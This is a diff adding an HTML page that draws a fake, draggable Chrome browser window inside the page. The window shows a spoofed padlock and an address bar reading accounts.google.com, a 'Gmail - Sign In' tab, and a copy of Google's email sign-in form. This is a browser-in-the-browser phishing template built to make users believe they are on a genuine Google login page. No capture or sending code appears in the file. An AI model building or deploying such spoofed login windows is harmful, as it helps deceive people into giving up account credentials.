@@ -1,0 +1,927 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Draggable Chrome Browser Popup</title>
+    <style>
+        @import url("https://fonts.googleapis.com/css2?family=Roboto&display=swap");
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0
+        }
+
+        body {
+            font-family: "Segoe UI", "Roboto", sans-serif;
+            background: #e0e0e0;
+            min-height: 100vh;
+            position: relative;
+        }
+
+        :root {
+            --bg-color: #ffffff;
+            --tab-bg: #DEE1E6;
+            --tab-active-bg: #ffffff;
+            --tab-hover-bg: #EEEFF1;
+            --text-color: #3C4043;
+            --text-secondary: #5F6368;
+            --border-color: #B6B4B6;
+            --address-bar-bg: #F1F3F4;
+            --btn-hover: #EEEEEE;
+            --win-btn-hover: rgba(0, 0, 0, 0.098);
+            --win-btn-active: rgba(0, 0, 0, 0.195);
+            --win-icon-filter: none;
+        }
+
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --bg-color: #202124;
+                --tab-bg: #2D2E30;
+                --tab-active-bg: #3C4043;
+                --tab-hover-bg: #3C4043;
+                --text-color: #E8EAED;
+                --text-secondary: #9AA0A6;
+                --border-color: #5F6368;
+                --address-bar-bg: #3C4043;
+                --btn-hover: #4A4D52;
+                --win-btn-hover: rgba(255, 255, 255, 0.1);
+                --win-btn-active: rgba(255, 255, 255, 0.2);
+                --win-icon-filter: brightness(0) invert(1);
+            }
+        }
+
+        /* DRAGGABLE POPUP CONTAINER */
+        .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 9999;
+        }
+
+        .draggable-browser {
+            position: absolute;
+            top: 50px;
+            left: 100px;
+            width: 1000px;
+            background: var(--bg-color);
+            border-radius: 12px;
+            box-shadow: 0 24px 38px 3px rgba(0, 0, 0, 0.14), 0 9px 46px 8px rgba(0, 0, 0, 0.12), 0 11px 15px -7px rgba(0, 0, 0, 0.2);
+            pointer-events: auto;
+            cursor: default;
+            z-index: 10000;
+            overflow: hidden;
+            transition: box-shadow 0.2s;
+        }
+
+        /* Chrome Browser Content */
+        #chrome-bar {
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+        }
+
+        /* Make the entire tab-bar draggable */
+        #tab-bar {
+            display: flex;
+            flex-direction: row;
+            height: 34px;
+            padding-left: 8px;
+            background: var(--tab-bg);
+            position: relative;
+            cursor: move;
+            user-select: none;
+        }
+
+        /* But make tabs themselves not draggable */
+        .tab-container,
+        #new-tab,
+        #window-buttons {
+            cursor: default;
+        }
+
+        #tabs {
+            flex: 1;
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            overflow: hidden;
+            cursor: default;
+        }
+
+        .tab-frame {
+            flex: 1;
+            max-width: 240px;
+            min-width: 0;
+            margin-right: -17px;
+            position: relative
+        }
+
+        .tab-container {
+            position: relative;
+            left: -8px;
+            overflow: hidden;
+            cursor: pointer
+        }
+
+        .tab-container::after {
+            position: absolute;
+            top: 7px;
+            right: 8px;
+            width: 1px;
+            height: 20px;
+            background: rgba(45, 48, 50, 0.336);
+            content: '';
+            transform: translateY(0.5px)
+        }
+
+        .tab-container.active::after,
+        .tab-container:hover::after {
+            display: none
+        }
+
+        .round {
+            z-index: 1;
+            position: absolute;
+            bottom: 0;
+            width: 32px;
+            height: 32px;
+            border: 8px solid transparent;
+            border-radius: 50%;
+            transition: .25s
+        }
+
+        .round-left {
+            left: -16px;
+            bottom: -8px;
+            transform: rotate(45deg)
+        }
+
+        .round-right {
+            right: -16px;
+            bottom: -8px;
+            transform: rotate(-45deg)
+        }
+
+        .tab {
+            z-index: 2;
+            position: relative;
+            left: 8px;
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            width: calc(100% - 16px);
+            height: 34px;
+            padding: 0 8px 0 12px;
+            border-top-left-radius: 8px;
+            border-top-right-radius: 8px;
+            background: transparent;
+            user-select: none;
+            transition: .25s
+        }
+
+        .tab-icon {
+            width: 16px;
+            height: 16px;
+            flex-shrink: 0
+        }
+
+        .tab-title {
+            position: relative;
+            top: -1px;
+            flex: 1;
+            white-space: nowrap;
+            overflow: hidden;
+            margin: 0 4px 0 8px;
+            color: var(--text-secondary);
+            font-size: 12px;
+            pointer-events: none
+        }
+
+        .tab-title::before {
+            position: absolute;
+            top: 0;
+            right: 0;
+            bottom: 0;
+            left: 0;
+            box-shadow: inset -18px 0 18px -18px var(--tab-bg), inset -18px 0 18px -18px var(--tab-bg);
+            content: '';
+            transition: .25s
+        }
+
+        .tab-close {
+            position: relative;
+            min-width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            flex-shrink: 0
+        }
+
+        .tab-close svg {
+            position: absolute;
+            top: 4px;
+            left: 4px;
+            pointer-events: none
+        }
+
+        .tab-close svg path {
+            fill: var(--text-secondary)
+        }
+
+        .tab-close:hover {
+            background: #E8EAED
+        }
+
+        .tab-close:hover svg path {
+            fill: #3B4042
+        }
+
+        .tab-close:active {
+            background: #DADCE0
+        }
+
+        .tab-container:hover .round-left {
+            border-right-color: var(--tab-hover-bg)
+        }
+
+        .tab-container:hover .round-right {
+            border-left-color: var(--tab-hover-bg)
+        }
+
+        .tab-container:hover .tab {
+            background: var(--tab-hover-bg)
+        }
+
+        .tab-container:hover .tab-title::before {
+            box-shadow: inset -18px 0 18px -18px var(--tab-hover-bg), inset -18px 0 18px -18px var(--tab-hover-bg)
+        }
+
+        .tab-container.active {
+            z-index: 5
+        }
+
+        .tab-container.active .round-left {
+            border-right-color: var(--tab-active-bg);
+            transition: 0s
+        }
+
+        .tab-container.active .round-right {
+            border-left-color: var(--tab-active-bg);
+            transition: 0s
+        }
+
+        .tab-container.active .tab {
+            background: var(--tab-active-bg);
+            transition: 0s
+        }
+
+        .tab-container.active .tab-title {
+            color: var(--text-color)
+        }
+
+        .tab-container.active .tab-title::before {
+            box-shadow: inset -18px 0 18px -18px var(--tab-active-bg), inset -18px 0 18px -18px var(--tab-active-bg);
+            transition: 0s
+        }
+
+        #new-tab {
+            display: flex;
+            flex-direction: row;
+            justify-content: center;
+            align-items: center;
+            width: 28px;
+            height: 28px;
+            margin-left: 9px;
+            border-radius: 50%;
+            flex-shrink: 0;
+            cursor: pointer;
+            transition: .25s
+        }
+
+        #new-tab svg {
+            width: 12px;
+            height: 12px
+        }
+
+        #new-tab svg path {
+            fill: var(--text-secondary)
+        }
+
+        #new-tab:hover {
+            background: #CBCED3
+        }
+
+        #new-tab:active {
+            background: #BFC1C6
+        }
+
+        #gap {
+            width: 64px
+        }
+
+        #window-buttons {
+            position: relative;
+            display: flex;
+            flex-direction: row
+        }
+
+        #window-buttons>div {
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 45px;
+            height: 29px;
+            margin-bottom: 5px;
+            cursor: pointer;
+            transition: .25s
+        }
+
+        #window-buttons>div svg {
+            width: 12px;
+            height: 12px;
+            color: var(--text-secondary);
+        }
+
+        #window-buttons>div img {
+            user-select: none;
+            pointer-events: none;
+            filter: var(--win-icon-filter);
+        }
+
+        #window-buttons>div:not(.win-close):hover {
+            background: var(--win-btn-hover)
+        }
+
+        #window-buttons>div:not(.win-close):active {
+            background: var(--win-btn-active);
+            transition: 0s
+        }
+
+        #window-buttons .win-close:hover {
+            background: #E81123
+        }
+
+        #window-buttons .win-close:hover svg {
+            color: white;
+        }
+
+        #window-buttons .win-close:active {
+            background: #E36571;
+            transition: 0s
+        }
+
+        #main-bar {
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            height: 36px;
+            padding: 0 6px;
+            background: var(--bg-color);
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .btn {
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 28px;
+            height: 28px;
+            margin: 0 2px;
+            border-radius: 50%;
+            cursor: pointer;
+            transition: .25s
+        }
+
+        .btn svg {
+            width: 14px;
+            height: 14px
+        }
+
+        .btn:not([disabled]):hover {
+            background: var(--btn-hover)
+        }
+
+        .btn:not([disabled]):active {
+            background: #E2E2E2;
+            transition: .05s
+        }
+
+        .btn:not([disabled]) svg path {
+            fill: var(--text-secondary)
+        }
+
+        .btn[disabled] {
+            cursor: default
+        }
+
+        .btn[disabled] svg path {
+            fill: #BABCBE
+        }
+
+        .btn.extension {
+            position: relative;
+            transform: scale(2);
+        }
+
+        .btn.extension img {
+            width: 16px
+        }
+
+        .btn.extension[data-notifications]::before {
+            position: absolute;
+            bottom: 0;
+            right: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 12px;
+            min-width: 12px;
+            border-radius: 2px;
+            box-shadow: 0 0 0 1px var(--bg-color);
+            background: #555555;
+            color: #FFFFFF;
+            font-size: 6px;
+            content: attr(data-notifications)
+        }
+
+        #address-bar {
+            flex: 1;
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            overflow: hidden;
+            height: 28px;
+            margin: 0 8px 0 6px;
+            border-radius: 20px;
+            background: var(--address-bar-bg);
+            white-space: pre;
+            cursor: text;
+            transition: box-shadow .15s, background .15s
+        }
+
+        #address-bar.selected {
+            box-shadow: 0 0 0 1px #B3CEFB, inset 0 0 0 1px #B3CEFB;
+            background: var(--bg-color)
+        }
+
+        .addr-btn {
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            height: 24px;
+            min-width: 32px;
+            padding: 0 10px;
+            margin: 0 2px;
+            border-radius: 20px;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background .25s
+        }
+
+        .addr-btn svg path {
+            fill: var(--text-secondary)
+        }
+
+        .addr-btn svg.favourite path {
+            fill: #4285F4
+        }
+
+        .addr-btn svg.https {
+            width: 12px;
+            height: 12px
+        }
+
+        .addr-btn img.favicon {
+            width: 16px;
+            height: 16px
+        }
+
+        #address-text {
+            flex: 1;
+            font-size: 14px;
+            color: var(--text-color);
+        }
+
+        #address-text .protocol {
+            color: var(--text-secondary)
+        }
+
+        #address-text .domain {
+            color: var(--text-color)
+        }
+
+        .hide {
+            display: none !important
+        }
+
+        .sep {
+            width: 1px;
+            height: 16px;
+            margin: 0 6px 0 8px;
+            background: var(--border-color);
+            flex-shrink: 0
+        }
+
+        /* Google Sign-in Box - EXACT styles you provided */
+        @import url("https://fonts.googleapis.com/css2?family=Roboto&display=swap");
+
+        .browser-content {
+            height: 550px;
+            overflow-y: auto;
+            background: white;
+            padding: 20px;
+            font-family: "Roboto";
+        }
+
+        .browser-content * {
+            margin: 0%;
+            padding: 0%;
+            box-sizing: border-box;
+        }
+
+        .browser-content a {
+            text-decoration: none;
+            color: #1a73e8;
+            display: block;
+            font-size: 14px;
+        }
+
+        .browser-content .container {
+            max-width: 450px;
+            border: 1px solid rgb(228, 228, 228);
+            margin: auto;
+            margin-top: 0;
+            border-radius: 10px;
+            padding: 2rem;
+            height: 500px;
+        }
+
+        .browser-content .top-content {
+            text-align: center;
+        }
+
+        .browser-content img {
+            width: 80px;
+            margin: 10px 0;
+        }
+
+        .browser-content h2 {
+            font-size: 20px;
+            font-weight: 100;
+            margin-bottom: 10px;
+        }
+
+        .browser-content .heading {
+            margin-bottom: 30px;
+            font-family: 'Roboto';
+        }
+
+        .browser-content input[type="email"] {
+            display: block;
+            border: 1px solid rgb(228, 228, 228);
+            font-size: 16px;
+            width: 100%;
+            height: 55px;
+            padding: 0 15px;
+            margin-bottom: 10px;
+            position: relative;
+            z-index: 2;
+            background-color: transparent;
+            outline: none;
+            border-radius: 5px;
+            position: relative;
+        }
+
+        .browser-content .inputs {
+            position: relative;
+        }
+
+        .browser-content .input-label {
+            position: absolute;
+            top: 15px;
+            font-size: 1.1rem;
+            left: 14px;
+            color: rgb(122, 122, 122);
+            font-weight: 100;
+            transition: 0.1s ease;
+            background-color: white;
+            padding: 0 5px;
+        }
+
+        .browser-content input[type="email"]:focus~.input-label {
+            top: -7px;
+            color: #1864c9;
+            font-size: 13px;
+            background-color: rgb(255, 255, 255);
+            z-index: 2;
+        }
+
+        .browser-content input[type="email"]:target~.input-label {
+            top: -7px;
+            color: #1864c9;
+            font-size: 13px;
+            background-color: rgb(255, 255, 255);
+            z-index: 2;
+        }
+
+        .browser-content .input:focus {
+            border: 2px solid #1a73e8;
+        }
+
+        .browser-content .link-btn {
+            margin-bottom: 2rem;
+        }
+
+        .browser-content .color {
+            color: rgb(90, 90, 90);
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+
+        .browser-content .btn-group {
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .browser-content .create-btn {
+            border: none;
+            background-color: transparent;
+            color: #1a73e8;
+            font-weight: bold;
+            cursor: pointer;
+            height: 35px;
+            padding: 10px 5px;
+        }
+
+        .browser-content .next-btn {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            height: 38px;
+            padding: 0 25px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .browser-content .create-btn:hover {
+            background-color: #e8f2ff6e;
+        }
+
+        .browser-content .next-btn:hover {
+            background-color: #1864c9;
+        }
+
+        .show-popup-btn {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            padding: 12px 24px;
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 500;
+            z-index: 10001;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+            transition: background 0.2s;
+        }
+
+        .show-popup-btn:hover {
+            background-color: #1557b0;
+        }
+    </style>
+</head>
+
+<body>
+    <button class="show-popup-btn" id="showPopupBtn">Show Chrome Browser</button>
+
+    <div class="popup-overlay" id="popupOverlay">
+        <div class="draggable-browser" id="draggableBrowser">
+            <div id="chrome-bar">
+                <div id="tab-bar">
+                    <div id="tabs">
+                        <div class="tab-frame">
+                            <div class="tab-container active" data-tab="0">
+                                <div class="tab">
+                                    <img src="https://google.com/favicon.ico" class="tab-icon">
+                                    <div class="tab-title">Gmail - Sign In</div>
+                                    <div class="tab-close"><svg xmlns="http://www.w3.org/2000/svg" width="8" height="8"
+                                            viewBox="0 0 16 16">
+                                            <path
+                                                d="M16,1.6L14.4,0L8,6.4L1.6,0L0,1.6L6.4,8L0,14.4L1.6,16L8,9.6l6.4,6.4l1.6-1.6L9.6,8L16,1.6z" />
+                                        </svg></div>
+                                </div>
+                                <div class="round round-left"></div>
+                                <div class="round round-right"></div>
+                            </div>
+                        </div>
+                        <div id="new-tab" title="New tab">
+                            <svg viewBox="0 0 16 16">
+                                <path d="M16 9.1H9.1V16H6.9V9.1H0V6.9h6.9V0h2.3v6.9H16V9.1z" />
+                            </svg>
+                        </div>
+                    </div>
+                    <div id="gap"></div>
+                    <div id="window-buttons">
+                        <div class="win-min" title="Minimise">
+                            <svg viewBox="0 0 10 10" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M0 5H10V6H0V5Z" fill="currentColor" />
+                            </svg>
+                        </div>
+                        <div class="win-max" id="win-max-btn" title="Maximise/Restore">
+                            <svg viewBox="0 0 10 10" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M0 0V10H10V0H0ZM9 9H1V1H9V9Z" fill="currentColor" />
+                            </svg>
+                        </div>
+                        <div class="win-close" title="Close">
+                            <svg viewBox="0 0 10 10" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M10 1L6 5L10 9L9 10L5 6L1 10L0 9L4 5L0 1L1 0L5 4L9 0L10 1Z"
+                                    fill="currentColor" />
+                            </svg>
+                        </div>
+                    </div>
+                </div>
+                <div id="main-bar">
+                    <div class="btn" id="back-btn" title="Back" disabled>
+                        <svg viewBox="0 0 16 16">
+                            <path d="M16,7H3.8l5.6-5.6L8,0L0,8l8,8l1.4-1.4L3.8,9H16V7z" />
+                        </svg>
+                    </div>
+                    <div class="btn" id="fwd-btn" title="Forward" disabled>
+                        <svg viewBox="0 0 16 16">
+                            <path d="M8,0L6.6,1.4L12.2,7H0v2h12.2l-5.6,5.6L8,16l8-8L8,0z" />
+                        </svg>
+                    </div>
+                    <div class="btn" id="reload-btn" title="Reload page">
+                        <svg viewBox="0 0 16 16">
+                            <path
+                                d="M13.6,2.3C12.2,0.9,10.2,0,8,0C3.6,0,0,3.6,0,8s3.6,8,8,8c3.7,0,6.8-2.5,7.7-6h-2.1c-0.8,2.3-3,4-5.6,4c-3.3,0-6-2.7-6-6s2.7-6,6-6c1.7,0,3.1,0.7,4.2,1.8L9,7h7V0L13.6,2.3z" />
+                        </svg>
+                    </div>
+                    <div id="address-bar">
+                        <div class="addr-btn" id="info-btn">
+                            <svg viewBox="0 0 16 16" class="https">
+                                <path
+                                    d="M12.6,5.3h-0.8V3.8C11.8,1.7,10.1,0,8,0S4.2,1.7,4.2,3.8v1.5H3.4C2.6,5.3,1.9,6,1.9,6.9v7.6c0,0.8,0.7,1.5,1.5,1.5h9.1c0.8,0,1.5-0.7,1.5-1.5V6.9C14.1,6,13.4,5.3,12.6,5.3z M10.4,5.3H5.6V3.8c0-1.3,1.1-2.4,2.4-2.4s2.4,1.1,2.4,2.4V5.3z" />
+                            </svg>
+                            <img src="" class="favicon hide">
+                        </div>
+                        <div id="address-text"><span class="protocol">https://</span><span
+                                class="domain">accounts.google.com</span><span class="protocol">/v3/signin/identifier?continue=https%3A%2F%2Fmail.google.com</span></div>
+                        <div class="addr-btn" id="bookmark-btn">
+                            <svg viewBox="0 0 16 16" class="not-favourite">
+                                <path
+                                    d="M16,5.8l-5.8-0.5L8,0L5.8,5.3L0,5.8l4.4,3.8l-1.3,5.6l4.9-3l4.9,3l-1.3-5.6L16,5.8z M8,10.7l-3,1.8l0.8-3.4L3.1,6.8l3.5-0.3L8,3.3l1.4,3.2l3.5,0.3l-2.7,2.3l0.8,3.4L8,10.7z" />
+                            </svg>
+                            <svg viewBox="0 0 16 16" class="favourite hide">
+                                <path
+                                    d="M8,12.2l4.9,3l-1.3-5.6L16,5.8l-5.8-0.5L8,0L5.8,5.3L0,5.8l4.4,3.8l-1.3,5.6L8,12.2z" />
+                            </svg>
+                        </div>
+                    </div>
+                    <div class="btn extension" data-ext="0" title="Extensions"><img
+                            src="https://i.imgur.com/xS5bZKl.png">
+                    </div>
+                    <div class="sep"></div>
+                    <div class="btn" id="menu-btn" title="Customise and control Google Chrome">
+                        <svg viewBox="0 0 16 16">
+                            <path
+                                d="M8,4c1.1,0,2-0.9,2-2S9.1,0,8,0S6,0.9,6,2S6.9,4,8,4z M8,6C6.9,6,6,6.9,6,8s0.9,2,2,2s2-0.9,2-2S9.1,6,8,6z M8,12c-1.1,0-2,0.9-2,2s0.9,2,2,2s2-0.9,2-2S9.1,12,8,12z" />
+                        </svg>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Browser Content - EXACT Google Sign-in Box from your styles -->
+            <div class="browser-content">
+                <div class="container">
+                    <div class="top-content">
+                        <img src="https://i.postimg.cc/CL7CmGSx/google-logo-png-29530.png" alt="Google logo">
+                        <h2>Sign in</h2>
+                        <p class="heading">Use your Google Account</p>
+                    </div>
+                    <div class="inputs">
+                        <input type="email" id="email" class="input" placeholder=" ">
+                        <label for="email" class="input-label">Email or phone</label>
+                    </div>
+                    <a href="#" class="link-btn">Forgot Email?</a>
+                    <p class="color">Not your computer? Use Guest mode to sign in privately.</p>
+                    <a href="#" class="link-btn">Learn More</a>
+                    <div class="btn-group">
+                        <button class="create-btn">Create account</button>
+                        <button class="next-btn">Next</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const popup = document.getElementById('draggableBrowser');
+        const dragHandle = document.getElementById('tab-bar');
+        let isDragging = false;
+        let currentX, currentY, initialX, initialY, xOffset = 0, yOffset = 0;
+
+        dragHandle.addEventListener('mousedown', dragStart);
+        document.addEventListener('mousemove', drag);
+        document.addEventListener('mouseup', dragEnd);
+
+        function dragStart(e) {
+            if (e.target.closest('.tab-container') ||
+                e.target.closest('#new-tab') ||
+                e.target.closest('#window-buttons')) {
+                return;
+            }
+            initialX = e.clientX - xOffset;
+            initialY = e.clientY - yOffset;
+            isDragging = true;
+            popup.style.cursor = 'grabbing';
+        }
+
+        function drag(e) {
+            if (isDragging) {
+                e.preventDefault();
+                currentX = e.clientX - initialX;
+                currentY = e.clientY - initialY;
+                xOffset = currentX;
+                yOffset = currentY;
+                popup.style.transform = `translate(${currentX}px, ${currentY}px)`;
+            }
+        }
+
+        function dragEnd() {
+            isDragging = false;
+            popup.style.cursor = 'default';
+        }
+
+        const overlay = document.getElementById('popupOverlay');
+        const showBtn = document.getElementById('showPopupBtn');
+
+        showBtn.addEventListener('click', () => {
+            overlay.style.display = 'block';
+        });
+
+        document.getElementById('bookmark-btn').addEventListener('click', () => {
+            const notFav = document.querySelector('#bookmark-btn .not-favourite');
+            const fav = document.querySelector('#bookmark-btn .favourite');
+            notFav.classList.toggle('hide');
+            fav.classList.toggle('hide');
+        });
+
+        let isMaximized = false;
+        const winMaxBtn = document.getElementById('win-max-btn');
+        const winMaxSvg = winMaxBtn.querySelector('svg');
+
+        document.getElementById('win-max-btn').addEventListener('click', () => {
+            isMaximized = !isMaximized;
+            if (isMaximized) {
+                popup.style.width = '100%';
+                popup.style.height = '100%';
+                popup.style.top = '0';
+                popup.style.left = '0';
+                popup.style.transform = 'none';
+                popup.style.borderRadius = '0';
+                xOffset = 0;
+                yOffset = 0;
+                winMaxSvg.innerHTML = '<path d="M2 0H8V1H3V6H2V0ZM0 2V10H8V2H0ZM7 9H1V3H7V9Z" fill="currentColor"/>';
+            } else {
+                popup.style.width = '1000px';
+                popup.style.height = 'auto';
+                popup.style.top = '50px';
+                popup.style.left = '100px';
+                popup.style.borderRadius = '12px';
+                popup.style.transform = 'none';
+                xOffset = 0;
+                yOffset = 0;
+                winMaxSvg.innerHTML = '<path d="M0 0V10H10V0H0ZM9 9H1V1H9V9Z" fill="currentColor"/>';
+            }
+        });
+
+        document.querySelector('.win-close').addEventListener('click', () => {
+            overlay.style.display = 'none';
+        });
+
+        document.querySelector('.win-min').addEventListener('click', () => {
+            overlay.style.display = 'none';
+        });
+
+        document.getElementById('reload-btn').addEventListener('click', () => {
+            const content = document.querySelector('.browser-content');
+            content.style.opacity = '0.5';
+            setTimeout(() => {
+                content.style.opacity = '1';
+            }, 200);
+        });
+
+    </script>
+</body>
+
+</html>
